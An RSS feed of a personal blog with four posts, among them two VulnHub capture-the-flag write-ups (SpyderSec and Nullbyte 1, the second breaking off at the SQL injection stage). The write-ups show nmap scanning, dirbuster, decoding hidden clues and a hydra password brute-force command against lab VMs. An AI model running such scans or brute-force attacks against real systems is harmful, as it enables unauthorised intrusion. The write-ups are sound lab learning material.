<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on Unlogic</title>
    <link>https://svenito.github.io/nowhere/post/</link>
    <description>Recent content in Posts on Unlogic</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Fri, 04 Dec 2015 00:00:00 +0000</lastBuildDate>
    <atom:link href="https://svenito.github.io/nowhere/post/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Brewing with a Pi</title>
      <link>https://svenito.github.io/nowhere/2015/12/04/brewing-with-a-pi/</link>
      <pubDate>Fri, 04 Dec 2015 00:00:00 +0000</pubDate>
      
      <guid>https://svenito.github.io/nowhere/2015/12/04/brewing-with-a-pi/</guid>
      <description>&lt;p&gt;It&amp;rsquo;s been a while since I&amp;rsquo;ve written here, but that doesn&amp;rsquo;t mean I haven&amp;rsquo;t
been busy. I&amp;rsquo;ve been working on a DIY version of &lt;a href=&#34;http://www.speidels-braumeister.de/en/braumeister/id-10-20-50-litre-braumeister.html&#34;&gt;Speidel&amp;rsquo;s Braumeister&lt;/a&gt;
and the software side of things has come along quite nicely.&lt;/p&gt;

&lt;p&gt;The idea is to have a Raspberry Pi controlled beer brewing system for cooking
the wort across a temperature profile. Much like the Braumeister, or Grainfather
style brewers. A probe monitors the temperature and will switch the heating on and
off to maintain the current temperature. You can set how long to hold each temperature
for and it will just plod through the profile.&lt;/p&gt;

&lt;p&gt;You can also set and hold a temperature if you want to simply heat the wort. A
pump running at intervals will also be operational during the brew.&lt;/p&gt;

&lt;p&gt;As I said, the software side is coming along, and I&amp;rsquo;ve done a quick test with a Pi
and the DS18B20 thermo probe, and that&amp;rsquo;s also working. Next up I need to
get myself a dedicated Pi (perhaps the new Pi Zero) and the rest of the kit, including
vessels, piping, heating etc. It probably won&amp;rsquo;t be fancy stainless steel like the
Braumeister, but it should achieve the same end result.
Once done I will write a complete build process, and the project will be open
source so everyone can use and improve upon it.&lt;/p&gt;

&lt;p&gt;But more about the software, it&amp;rsquo;s running on &lt;a href=&#34;https://cherrypy.org&#34;&gt;CherryPy&lt;/a&gt; and
currently looks like this:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://i.imgur.com/c4IR4yT.png&#34;&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/c4IR4yT.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/a&gt;

&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/c4IR4yT.png&#34; /&gt;
    
    
    &lt;figcaption&gt;
        &lt;h4&gt;Brewpy interface&lt;/h4&gt;
        
    &lt;/figcaption&gt;
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;ve put the &lt;a href=&#34;https://github.com/Svenito/brewpy&#34;&gt;code on Github&lt;/a&gt; already, so if
you are keen and fancy building the rest of the kit yourself already, please
check it out.&lt;/p&gt;

&lt;p&gt;Hopefully I&amp;rsquo;ll get the time to put the rest of the project together early
next year. Got a house to get up to speed as well, so time is a little limited.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>SpyderSec solution</title>
      <link>https://svenito.github.io/nowhere/2015/09/09/spydersec-solution/</link>
      <pubDate>Wed, 09 Sep 2015 00:00:00 +0000</pubDate>
      
      <guid>https://svenito.github.io/nowhere/2015/09/09/spydersec-solution/</guid>
      <description>&lt;p&gt;Another day, another VM. Today it&amp;rsquo;s the &lt;a href=&#34;https://www.vulnhub.com/entry/spydersec-challenge,128/&#34;&gt;SpyderSec Challenge&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;So let me start it up and get on it.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/nah3Wah.gif&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;As per usual I need the IP of the machine and
the services it has running (if any). Straight from the Unlogic Cookbook&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~/Downloads# nmap -sn 192.168.56.0/24

Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-09-09 16:07 BST
Nmap scan report for 192.168.56.1
Host is up (0.00039s latency).
MAC Address: 0A:00:27:00:00:00 (Unknown)
Nmap scan report for 192.168.56.100
Host is up (0.00017s latency).
MAC Address: 08:00:27:FF:57:41 (Cadmus Computer Systems)
Nmap scan report for 192.168.56.101
Host is up (0.00028s latency).
MAC Address: 08:00:27:56:11:10 (Cadmus Computer Systems)
Nmap scan report for 192.168.56.102
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 1.77 seconds

root@kali:~/Downloads# nmap -p- -sV 192.168.56.101

Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-09-09 16:07 BST
Nmap scan report for 192.168.56.101
Host is up (0.00049s latency).
Not shown: 65533 filtered ports
PORT   STATE  SERVICE VERSION
22/tcp closed ssh
80/tcp open   http    Apache httpd
MAC Address: 08:00:27:56:11:10 (Cadmus Computer Systems)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 155.80 seconds
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Lucky me, only one service running, and it&amp;rsquo;s good old http at that.
Let&amp;rsquo;s take a look at that page then:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://i.imgur.com/IiA6MlY.png&#34;&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/IiA6MlY.png&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Without wasting much time, let&amp;rsquo;s get to the clue hunting. First things first: check the source.
And there&amp;rsquo;s clue number one, right between those script tags. It evals a function which seems to
do some text processing. I&amp;rsquo;ll open Firebug to see if that shows anything interesting, and sure
enough&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;SyntaxError&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;missing&lt;/span&gt; &lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;before&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;statement&lt;/span&gt;
    &lt;span style=&#34;color: #ae81ff&#34;&gt;61&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;c&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;72&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;74&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;27&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;d&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;75&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;c&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;64&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;65&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;72&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;e&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;66&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;62&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;69&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;27&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;29&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color: #ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color: #a6e22e&#34;&gt;b&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So that&amp;rsquo;s the output from the eval. It throws an error because the result isn&amp;rsquo;t valid
javascript. It seems to me as though it might be HEX. I&amp;rsquo;ll put it through Burp&amp;rsquo;s decoder and
sure enough it resolves to &lt;code&gt;a:l:e:r:t:(:&#39;:m:u:l:d:e:r:.:f:b:i:&#39;:):;&lt;/code&gt;. That&amp;rsquo;s not going to
affect the page in any way, but I&amp;rsquo;m sure it&amp;rsquo;s a clue. I&amp;rsquo;ll note it down and carry on exploring.&lt;/p&gt;

&lt;p&gt;The CSS contains a base64 encoded gif. I decided to investigate it by converting it to a file
and opening it in Gimp to examine it. Nothing much of interest there either. Hexdump also shows
nothing of note.&lt;/p&gt;

&lt;p&gt;Ok then, apart from that there&amp;rsquo;s nothing of interest in the source, so let me move onto the images on the page.
There&amp;rsquo;s two images: &lt;code&gt;Challenge.png&lt;/code&gt; and &lt;code&gt;SpyderSecLogo200.png&lt;/code&gt;. On first glance they appear to
have nothing special about them, but once examined with &lt;code&gt;exiftool&lt;/code&gt; I see something of interest&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~/spydersec# exiftool Challenge.png 
ExifTool Version Number         : 9.74
File Name                       : Challenge.png
Directory                       : .
File Size                       : 83 kB
File Modification Date/Time     : 2015:09:01 07:25:59+01:00
File Access Date/Time           : 2015:09:09 14:29:25+01:00
File Inode Change Date/Time     : 2015:09:09 14:29:19+01:00
File Permissions                : rw-r--r--
File Type                       : PNG
MIME Type                       : image/png
Image Width                     : 540
Image Height                    : 540
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Background Color                : 255 255 255
Pixels Per Unit X               : 2835
Pixels Per Unit Y               : 2835
Pixel Units                     : meters
Comment                         : 35:31:3a:35:33:3a:34:36:3a:35:37:3a:36:34:3a:35:38:3a:33:35:3a:
                                  37:31:3a:36:34:3a:34:35:3a:36:37:3a:36:61:3a:34:65:3a:37:61:3a:
                                  34:39:3a:33:35:3a:36:33:3a:33:30:3a:37:38:3a:34:32:3a:34:66:3a:
                                  33:32:3a:36:37:3a:33:30:3a:34:61:3a:35:31:3a:33:64:3a:33:64
Image Size                      : 540x540
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Hex strings are the order of the day here at SpyderSec. So back to Burp&amp;rsquo;s decoder once more
after removing all the colons. The string decodes to another hex string. Same dance again, and
I get a typical base64 string, decode once more and be rewarded with &lt;code&gt;A!Vu~jtH#729sLA;h4%&lt;/code&gt;. Which is
not encoded anymore. I make a note of it and carry on sleuthing.&lt;/p&gt;

&lt;p&gt;Watch out, here comes the reliable &lt;code&gt;dirbuster&lt;/code&gt;. Running it with the regular word list I discover the &lt;code&gt;v&lt;/code&gt; subdirectory.
Browsing to that however merely responds with a &lt;code&gt;403 Forbidden&lt;/code&gt; reply. I&amp;rsquo;ve not exhausted all the
nooks and crannies yet, there&amp;rsquo;s still that cookie jar to poke at.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Firebug -&amp;gt; Cookie tab -&amp;gt; URI /v/81JHPbvyEQ8729161jd6aKQ0N4/
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Another clue&amp;hellip;. leading me to a subdirectory under &lt;code&gt;v&lt;/code&gt;. But that&amp;rsquo;s also forbidden. Well, let
me just plug some of the data we&amp;rsquo;ve found so far into it. The random characters from the
exif data result in a 404, but the string from the javascript alert box however brings up a
download dialog for a file called &lt;code&gt;mulder.fbi&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~/spydersec# wget http://192.168.56.101//v/81JHPbvyEQ8729161jd6aKQ0N4/mulder.fbi
--2015-09-09 17:24:38--  http://192.168.56.101//v/81JHPbvyEQ8729161jd6aKQ0N4/mulder.fbi
Connecting to 192.168.56.101:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 13960421 (13M) [text/plain]
Saving to: ‘mulder.fbi’

mulder.fbi.1            100%[===============================&amp;gt;]  13.31M  5.52MB/s   in 2.4s   

2015-09-09 17:24:41 (5.52 MB/s) - ‘mulder.fbi’ saved [13960421/13960421]

root@kali:~/spydersec# file mulder.fbi 
mulder.fbi: ISO Media, MP4 v2 [ISO 14496-14]
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;A video file, which when I play it, is the song &amp;ldquo;Twilight Time&amp;rdquo; by &amp;ldquo;The Platters&amp;rdquo;.&lt;/p&gt;

&lt;p&gt;So here I hit another dead end.&lt;/p&gt;

&lt;p&gt;Let me think

&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/CbfWCmv.gif&#34; /&gt;
    
    
&lt;/figure&gt;
&lt;/p&gt;

&lt;p&gt;I&amp;rsquo;ll take inventory of the clues I have left now:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;A music video &amp;ldquo;Twilight time&amp;rdquo; titled &lt;em&gt;mulder.fbi&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;A seeming random string &lt;code&gt;A!Vu~jtH#729sLA;h4%&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So I ask myself, why is a video of a song named &lt;em&gt;mulder.fbi&lt;/em&gt;? So I do a little research
and after searching for &lt;code&gt;the platters &amp;quot;twilight time&amp;quot; x files&lt;/code&gt; I hit this section in a
&lt;a href=&#34;https://en.wikipedia.org/wiki/Kill_Switch_(The_X-Files&#34;&gt;Wikipedia article&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;When he puts it into the car stereo, it plays &amp;quot;Twilight Time&amp;quot; 
by The Platters. However, the agents take it to the Lone Gunmen, 
who discover that the disc contains a large quantity of encrypted data
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Well if that ain&amp;rsquo;t a clue and a bit! Ok, so a little more research of what data you
can hide in a video file (search for &lt;code&gt;hiding files video mp4&lt;/code&gt;) I am directed to a
&lt;a href=&#34;http://lifehacker.com/5771142/embed-a-truecrypt-volume-in-a-playable-video-file&#34;&gt;Lifehacker article&lt;/a&gt;
describing the process of hiding Truecrypt volumes in MP4s. It mentions a few ways to
detect such a volume in a video, but to be honest, I might as well just try and mount the volume.
That should be the easiest and quickest way to see if I am on the right track.&lt;/p&gt;

&lt;p&gt;Sure enough, there&amp;rsquo;s a volume in the video, but it needs a password. Well there&amp;rsquo;s only
one unused piece of the puzzle left. I plug that in and there&amp;rsquo;s our volume with the &lt;code&gt;flag.txt&lt;/code&gt; file
which contains:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;Congratulations! 

You are a winner. 

Please leave some feedback on your thoughts regarding this challenge.
Was it fun? Was it hard enough or too easy? 
What did you like or dislike, what could be done better?

https://www.spydersec.com/feedback
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Well that was a nice challenge, especially the truecrypt volume in the MP4. That&amp;rsquo;s
something new I learned from this. So thanks to &lt;a href=&#34;https://twitter.com/Spydersec&#34;&gt;@SpyderSec&lt;/a&gt;
for the challenge, and thanks to you for stopping by to read this.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Extracting bup files in Linux</title>
      <link>https://svenito.github.io/nowhere/2015/09/03/extracting-bup-files-in-linux/</link>
      <pubDate>Thu, 03 Sep 2015 00:00:00 +0000</pubDate>
      
      <guid>https://svenito.github.io/nowhere/2015/09/03/extracting-bup-files-in-linux/</guid>
      <description>&lt;p&gt;I recently got hold of some malware that got snapped up by McAfee and stored in a bup file.
Keen to take a look at it, I researched how to &amp;lsquo;unbup&amp;rsquo; files and found this page:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://blog.opensecurityresearch.com/2012/07/unbup-mcafee-bup-extractor-for-linux.html&#34;&gt;http://blog.opensecurityresearch.com/2012/07/unbup-mcafee-bup-extractor-for-linux.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;A slow bash script? A faster script in Perl? No, that won&amp;rsquo;t do. Rather than search
for a Python implementation I decided to use this as an opportunity to write
something, and thus my &lt;code&gt;unbup.py&lt;/code&gt; was born. You can get it from my &lt;a href=&#34;https://github.com/Svenito/unbup&#34;&gt;GitHub&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;It&amp;rsquo;s about as simple as the bash script in terms of features, but it works, and
it is also fairly fast. I&amp;rsquo;ve only tested it with the one file I have, but if
you decide to use it, and it doesn&amp;rsquo;t work, send me the bup file and I&amp;rsquo;ll take a look
at fixing it. Otherwise feel free to fork it and make your own fixes.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Nullbyte 1 solution</title>
      <link>https://svenito.github.io/nowhere/2015/08/25/nullbyte-1-solution/</link>
      <pubDate>Tue, 25 Aug 2015 00:00:00 +0000</pubDate>
      
      <guid>https://svenito.github.io/nowhere/2015/08/25/nullbyte-1-solution/</guid>
      <description>

&lt;p&gt;I&amp;rsquo;ve been AFK for a while because of various reasons, but now I&amp;rsquo;m back and have
managed to scrape a little time together to get on with some of &lt;a href=&#34;https://vulnhub.com&#34;&gt;Vulnhub&amp;rsquo;s&lt;/a&gt;
new VMs.&lt;/p&gt;

&lt;p&gt;So let&amp;rsquo;s start with &lt;a href=&#34;https://www.vulnhub.com/entry/nullbyte-1,126/&#34;&gt;Nullbyte 1&lt;/a&gt;&lt;/p&gt;

&lt;h1 id=&#34;stage-1:d33d1c43b31d749c4d445e01e4ef8fef&#34;&gt;Stage 1&lt;/h1&gt;

&lt;p&gt;I ran the usual service discovery and found:&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# nmap -sV 192.168.56.101

Starting Nmap 6.49BETA4 &lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt; https://nmap.org &lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt; at 2015-08-25 11:29 BST
Nmap scan report &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; 192.168.56.101
Host is up &lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;0.00057s latency&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt;.
Not shown: &lt;span style=&#34;color: #ae81ff&#34;&gt;997&lt;/span&gt; closed ports
PORT    STATE SERVICE VERSION
80/tcp  open  http    Apache httpd 2.4.10 &lt;span style=&#34;color: #f92672&#34;&gt;((&lt;/span&gt;Debian&lt;span style=&#34;color: #f92672&#34;&gt;))&lt;/span&gt;
111/tcp open  rpcbind 2-4 &lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;RPC &lt;span style=&#34;color: #75715e&#34;&gt;#100000)&lt;/span&gt;
777/tcp open  ssh     OpenSSH 6.7p1 Debian &lt;span style=&#34;color: #ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt;
Service Info: OS: Linux&lt;span style=&#34;color: #f8f8f2&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;HTTP server on 80 and ssh on 777. I&amp;rsquo;m going to take the straightforward one, and head
to the HTTP server first.&lt;/p&gt;

&lt;p&gt;Upon opening the page I only get an image and some text&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;http://i.imgur.com/SlVGKol.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I ran &lt;code&gt;dirbuster&lt;/code&gt; on the root and got a couple of hits: &lt;code&gt;uploads&lt;/code&gt; and &lt;code&gt;phpmyadmin&lt;/code&gt;. The first had disabled directory listing
and the second was a no go, but at least told me there was a SQL server available somewhere.&lt;/p&gt;

&lt;p&gt;The source of the page doesn&amp;rsquo;t reveal anything else either, so that last place we might be able to find something
is the image itself. There doesn&amp;rsquo;t appear to be any steganography involved here and nothing in the hexdump of the image
either. Well, let me take a look at the EXIF data then.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~/Downloads# exiftool main.gif 
ExifTool Version Number         : 9.74
File Name                       : main.gif
Directory                       : .
File Size                       : &lt;span style=&#34;color: #ae81ff&#34;&gt;16&lt;/span&gt; kB
File Modification Date/Time     : 2015:08:25 10:27:37+01:00
File Access Date/Time           : 2015:08:25 10:28:35+01:00
File Inode Change Date/Time     : 2015:08:25 10:27:37+01:00
File Permissions                : rw-r--r--
File Type                       : GIF
MIME Type                       : image/gif
GIF Version                     : 89a
Image Width                     : 235
Image Height                    : 302
Has Color Map                   : No
Color Resolution Depth          : 8
Bits Per Pixel                  : 1
Background Color                : 0
Comment                         : P-&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt;: kzMb5nVYJw
Image Size                      : 235x302
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Hrmm, that comment looks unusual. Let&amp;rsquo;s try that in the URL. Initially I got a 404
but that&amp;rsquo;s because I didn&amp;rsquo;t remove the &lt;code&gt;P-):&lt;/code&gt;. Hitting &lt;code&gt;http://192.168.56.101/kzMb5nVYJw&lt;/code&gt;
takes me to a form asking for a key.&lt;/p&gt;

&lt;h1 id=&#34;stage-2:d33d1c43b31d749c4d445e01e4ef8fef&#34;&gt;Stage 2&lt;/h1&gt;

&lt;p&gt;Typing in something random just shows &lt;code&gt;invalid key&lt;/code&gt;. Ok, let me take a look at the source,
see where this thing goes.&lt;/p&gt;

&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;&lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;center&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;form&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;method=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;post&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;action=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;index.php&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;&amp;gt;&lt;/span&gt;
Key:&lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;br&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;input&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;type=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;password&amp;quot;&lt;/span&gt; &lt;span style=&#34;color: #a6e22e&#34;&gt;name=&lt;/span&gt;&lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;key&amp;quot;&lt;/span&gt;&lt;span style=&#34;color: #f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt; 
&lt;span style=&#34;color: #f92672&#34;&gt;&amp;lt;/center&amp;gt;&lt;/span&gt;
&lt;span style=&#34;color: #75715e&#34;&gt;&amp;lt;!-- this form isn&amp;#39;t connected to mysql, password ain&amp;#39;t that complex --!&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ok, so no SQLi here then, and the password isn&amp;rsquo;t complex either. I&amp;rsquo;m guessing
a simple wordlist might solve this for me. Time to break out &lt;code&gt;hydra&lt;/code&gt; for this:&lt;/p&gt;

&lt;p&gt;&lt;div class=&#34;highlight&#34; style=&#34;background: #272822&#34;&gt;&lt;pre style=&#34;line-height: 125%&#34;&gt;root@kali:~# hydra 192.168.56.101 http-form-post &lt;span style=&#34;color: #e6db74&#34;&gt;&amp;quot;/kzMb5nVYJw/index.php:key=^PASS^:invalid key&amp;quot;&lt;/span&gt; -l x -P /usr/share/dict/words -t &lt;span style=&#34;color: #ae81ff&#34;&gt;10&lt;/span&gt; -w 30
Hydra v8.1 &lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;c&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color: #ae81ff&#34;&gt;2014&lt;/span&gt; by van Hauser/THC - Please &lt;span style=&#34;color: #66d9ef&#34;&gt;do&lt;/span&gt; not use in military or secret service organizations, or &lt;span style=&#34;color: #66d9ef&#34;&gt;for&lt;/span&gt; illegal purposes.

Hydra &lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;http://www.thc.org/thc-hydra&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt; starting at 2015-08-25 11:41:58
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;DATA&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; max &lt;span style=&#34;color: #ae81ff&#34;&gt;10&lt;/span&gt; tasks per &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt; server, overall &lt;span style=&#34;color: #ae81ff&#34;&gt;64&lt;/span&gt; tasks, &lt;span style=&#34;color: #ae81ff&#34;&gt;99171&lt;/span&gt; login tries &lt;span style=&#34;color: #f92672&#34;&gt;(&lt;/span&gt;l:1/p:99171&lt;span style=&#34;color: #f92672&#34;&gt;)&lt;/span&gt;, ~154 tries per task
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;DATA&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; attacking service http-post-form on port 80
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;STATUS&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; 18687.00 tries/min, &lt;span style=&#34;color: #ae81ff&#34;&gt;18687&lt;/span&gt; tries in 00:01h, &lt;span style=&#34;color: #ae81ff&#34;&gt;80484&lt;/span&gt; todo in 00:05h, &lt;span style=&#34;color: #ae81ff&#34;&gt;10&lt;/span&gt; active
&lt;span style=&#34;color: #f92672&#34;&gt;[&lt;/span&gt;80&lt;span style=&#34;color: #f92672&#34;&gt;][&lt;/span&gt;http-post-form&lt;span style=&#34;color: #f92672&#34;&gt;]&lt;/span&gt; host: 192.168.56.101   login: x   password: elite
&lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt; of &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt; target successfully completed, &lt;span style=&#34;color: #ae81ff&#34;&gt;1&lt;/span&gt; valid password found
&lt;/pre&gt;&lt;/div&gt;
&lt;/p&gt;

&lt;p&gt;Bingo. Once I enter that into the field I am able to search for usernames.&lt;/p&gt;

&lt;h1 id=&#34;stage-3:d33d1c43b31d749c4d445e01e4ef8fef&#34;&gt;Stage 3&lt;/h1&gt;

&lt;p&gt;Entering all sorts of names reveals nothing. At this point I am guessing this
is the part that is backed by a SQL database. Although usernames and the usual
SQLi synbols don&amp;rsquo;t do much, entering nothing dumps multiple records. Maybe I will
try to &lt;code&gt;sqlmap&lt;/code&gt; the URL to see if there&amp;rsquo;s any vulnerabilities there&lt;/p&gt;

